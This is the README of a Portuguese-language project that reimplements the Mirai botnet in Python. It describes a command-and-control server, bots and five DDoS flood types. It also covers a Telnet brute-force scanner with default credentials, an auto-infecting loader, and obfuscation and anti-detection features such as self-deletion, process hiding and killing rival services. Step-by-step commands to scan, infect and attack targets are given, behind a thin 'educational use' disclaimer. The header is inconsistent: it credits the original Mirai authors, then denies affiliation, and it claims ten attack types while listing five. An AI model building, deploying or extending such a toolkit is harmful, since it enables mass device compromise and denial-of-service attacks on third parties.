# Mirai-PTBR
Mirai botnet

## Criadores Do Projeto Mirai: 
#### Paras Jha
#### Josiah White
#### Dalton Norman

* This project is NOT affiliated with the original Mirai authors.
* Created independently for educational and defensive security research purposes.

> **Implementação educacional do Mirai Botnet em Python para testes de penetração autorizados.**
>
> ⚠️ **USO EXCLUSIVO PARA PROFISSIONAIS DE SEGURANÇA AUTORIZADOS**
> Este software é fornecido exclusivamente para testes de penetração, pesquisa de segurança,
> e análise de malware em sistemas sobre os quais você possui autorização explícita por escrito.
> O uso não autorizado é ilegal sob o Computer Fraud and Abuse Act (CFAA) e leis equivalentes.

## 📋 Visão Geral

O **Mirai-PTBR** é uma reimplementação completa do Mirai botnet em Python puro,
projetada para ambientes de laboratório controlados e assessments de segurança.
Diferente do Mirai original (escrito em C para dispositivos IoT), esta versão
é multiplataforma e modular, facilitando entendimento e modificação.

### Arquitetura

┌──────────────┐     ┌──────────────┐     ┌──────────────┐ 
│ CNC          │◄────│ Bot          │────►│ Ataques      │ 
│ (asyncio)    │     │ (threading)  │     │ (scapy/raw)  │ 
└──────┬───────┘     └──────┬───────┘     └──────────────┘ 
       └────────┬───────────┘ 
┌───────────────┴───────────────┐ 
│ Scanner       │ (ThreadPoolExecutor) │
└───────────────┬───────────────┘ 
                │ 
┌───────────────┴───────────────┐ └────► 
│ Loader │ │ (HTTP/TFTP/Echo Deploy) │ 
└───────────────────────────────┘

### Componentes

| Componente | Descrição | Tecnologia |
|-----------|-----------|------------|
| **CNC** | Command & Control server | `asyncio` protocolo binário |
| **Bot** | Cliente que recebe comandos | `threading` + raw sockets |
| **Ataques** | 10 tipos de ataque DDoS | `scapy`, `socket`, `ssl` |
| **Scanner** | Varredura + brute-force Telnet | `ThreadPoolExecutor` |
| **Loader** | Deploy automático do binário | HTTP/TFTP/Echo |
| **Obfuscation** | Ofuscação de strings/config | XOR/RC4/Base64 |

## 🚀 Instalação

```bash
# Clone
git clone https://github.com/seuuser/mirai-ptbr.git
cd mirai-ptbr

# (Opcional) Virtual env
python3 -m venv venv
source venv/bin/activate

# Dependências
pip install -r requirements.txt

# Estrutura de diretórios
mkdir -p bins logs
```

## Dependências

```bash
# requirements.txt
asyncio              # (stdlib) CNC server
scapy>=2.4.5         # (opcional) Para raw sockets avançados
pyinstaller>=5.0     # (opcional) Para compilar bot
```
Python 3.8+ (stdlib cobre 90% das funcionalidades).

## 🎮 Uso Rápido

### 1. Inicie o CNC

```bash
python main.py cnc

# Ou diretamente:

python -m cnc.main
```

### 2. Compile e execute o Bot

```bash
# Terminal 2: Compila
CNC_HOST=127.0.0.1 python -m bot.build

# Terminal 3: Executa
python -m bot.bot
```

### 3. Interaja com o CNC

```
> bots                    # Lista bots conectados
> stats                   # Estatísticas
> attack udp 192.168.1.1  # Ataca alvo
> attack all              # Ataca todos os alvos
> attacks                 # Lista ataques ativos
> stop                    # Para ataque atual
```

### 4. Escaneie e infecte

```bash
# Scanner + Loader integrados
python main.py scan --network 192.168.1.0/24

# Loader standalone
python -m loader.loader --interactive
```

## 📂 Estrutura do Projeto

```bash
mirai-ptbr/
├── main.py                 # Entry point unificado
├── requirements.txt        # Dependências
├── README.md               # Esta documentação
├── DOCS.md                 # Documentação técnica completa
│
├── cnc/                    # Command & Control
│   ├── __init__.py
│   ├── main.py             # Entry point (server + CLI)
│   ├── server.py           # Servidor TCP asyncio
│   ├── protocol.py         # Protocolo binário
│   ├── attack.py           # Gerenciador de ataques
│   └── client.py           # CLI interativa
│
├── bot/                    # Bot client
│   ├── __init__.py
│   ├── bot.py              # Bot principal
│   ├── bot_minimal.py      # Versão minimalista (~150 linhas)
│   └── build.sh            # Script de build (PyInstaller)
│
├── attacks/                # Módulos de ataque
│   ├── __init__.py
│   ├── main.py             # Router + AttackRunner
│   ├── udp.py              # UDP flood
│   ├── syn.py              # SYN/ACK flood
│   ├── dns.py              # DNS amplification
│   ├── http.py             # HTTP GET/POST flood
│   └── vse.py              # Valve Source Engine query flood
│
├── scanner/                # Scanner de vulnerabilidades
│   ├── __init__.py
│   ├── scanner.py          # Scanner principal
│   ├── state_machine.py    # Máquina de estados
│   └── creds.py            # 62 credenciais padrão
│
├── loader/                 # Loader (deploy do bot)
│   ├── __init__.py
│   ├── loader.py           # Loader principal
│   ├── serve.py            # Servidores HTTP/TFTP
│   ├── arch.py             # Detectores de arquitetura
│   ├── deploy.py           # Métodos de deploy
│   └── payload_builder.py  # Construtores de payload
│
├── tools/                  # Ferramentas auxiliares
│   └── enc.py              # Ofuscação XOR/RC4/Base64
│
└── bins/                   # Binários compilados (criar)
    ├── arm
    ├── aarch64
    ├── mips
    ├── x86
    └── x86_64
```

---

## 🔧 Configuração

### Variáveis de Ambiente

| Variável             | Default   | Descrição                  |
|----------------------|-----------|----------------------------|
| **CNC_HOST**         | 127.0.0.1 | IP do servidor CNC         |
| **CNC_PORT**         | 48101     | Porta do CNC               |
| **BOT_ID**           | (auto)    | Identificador único do bot | 
| **LOADER_HTTP_PORT** | 8080      | Porta HTTP do loader       |
| **LOADER_TFTP_PORT** | 69        | Porta TFTP do loader       |

## Protocolo Binário (CNC ↔ Bot)

```bash
[4 bytes LE: duration] [1 byte: attack_type] [1 byte: targets_len] [targets...] [1 byte: opts_len] [opts...]

Handshake: bot envia "MIRA" + bot_id
Heartbeat: bot envia \x00 a cada 60s
Comando: CNC envia pacote AttackCommand
```

## Tipos de Ataque

| ID      | Nome         | Descrição                       |
|---------|--------------|---------------------------------|
| **0**   | UDP          | UDP flood (payload randômico)   |
| **1**   | SYN          | SYN/ACK flood (raw sockets)     |
| **2**   | DNS          | DNS amplification (ANY query)   | 
| **3**   | HTTP         | HTTP GET/POST flood             |
| **4**   | VSE          | Valve Source Engine query flood |
| **5-9** | (RESERVADIS) | Para expansão                   |

## 🧪 Cenários de Teste

### Laboratório Local

```bash
# Terminal 1: CNC
python main.py cnc

# Terminal 2: Scanner + Loader (rede local)
python main.py scan --network 192.168.1.0/24 --auto-infect

# Terminal 3: Bot manual
python main.py bot
```

### Teste de Resiliência

```
# Simula queda de CNC
# Bot reconecta automaticamente com backoff exponencial (1-60s)

# Mata bot e verifica auto-delete
# Single-instance lock evita múltiplas instâncias
```

## 🔒 Ofuscação

```bash
# Gera chave
python tools/enc.py --generate-key

# Ofusca string
python tools/enc.py string "meu.cnc.com" --key 0xDEADBEEF

# Ofusca porta
python tools/enc.py port 48101

# Gera tabela completa
python tools/enc.py --generate-table -o cnc/table.py

# Decofusca
python tools/enc.py --decrypt "a1b2c3..." --key 0xDEADBEEF
```

## 📊 Performance

| Operação              | Performance                     |
|-----------------------|---------------------------------|
| CNC (asyncio)         | ~10k bots simultâneos           |
| UDP flood (4 threads) | ~500 Mbps (depende do hardware) |
| Scanner (100 threads) | ~50k IPs/minuto                 |
| Loader                | 50 deploys simultâneos          |

## 🛡️ Anti-Detecção

* **Ofuscação XOR/RC4**: Strings sensíveis nunca em plaintext
* **Auto-delete**: Binário se remove após execução
* **Process hiding**: Nome aleatório em `/tmp/.XXXX`
* **Single-instance**: Lock file por hash do CNC
* **Killer**: Remove processos concorrentes (telnetd, sshd)
* **Backoff exponencial**: Evita flooding na reconexão


## 📚 Documentação

- `DOCS.md` [blocked] — Documentação técnica completa
- `tools/enc.py --help` — Ferramenta de ofuscação
- Código-fonte comentado em português

## ⚖️ Aviso Legal

Este software é exclusivamente para fins educacionais e de pesquisa em segurança. O uso para atacar sistemas sem autorização é crime em praticamente todas as jurisdições.

#### Você é responsável por:

1. Obter autorização explícita por escrito antes de qualquer teste
2. Cumprir todas as leis locais, estaduais e federais aplicáveis
3. Usar apenas em sistemas que você possui ou tem permissão para testar
4. Isolar testes em ambiente controlado (VMs, containeres)
     

## 📄 Licença

MIT License — Uso educacional e de pesquisa apenas.

